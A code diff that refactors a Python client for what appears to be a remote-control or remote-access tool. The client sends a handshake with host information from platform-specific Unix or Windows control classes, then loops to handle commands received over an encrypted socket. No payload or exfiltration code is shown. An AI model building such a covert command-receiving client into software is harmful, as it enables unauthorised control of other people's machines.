@@ -9,10 +9,16 @@ import base64
 import socket
 import time
 
-from src.client import control
+from src.definitions import platforms
+
+if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
+    from src.client.control.unix import Unix as Control
+else:
+    from src.client.control.windows import Windows as Control
+
 from src.encrypted_socket import EncryptedSocket
 from src.client.command_handler import CommandHandler
-from src.command_defs import *
+from src.definitions.commands import *
 
 
 class Socket(EncryptedSocket):
@@ -37,10 +43,12 @@ class Socket(EncryptedSocket):
         self.set_key(key)
         self.logger.debug(f"recv key: {key}")
 
-        # send handshake
-        self.send_json(CLIENT_HANDSHAKE, control.get_info())
+        c = Control(self)
 
-        ch = CommandHandler(self)
+        # send handshake
+        self.send_json(CLIENT_HANDSHAKE, c.get_info())
+
+        ch = CommandHandler(c)
 
         while True:
             msg = self.recv_json()
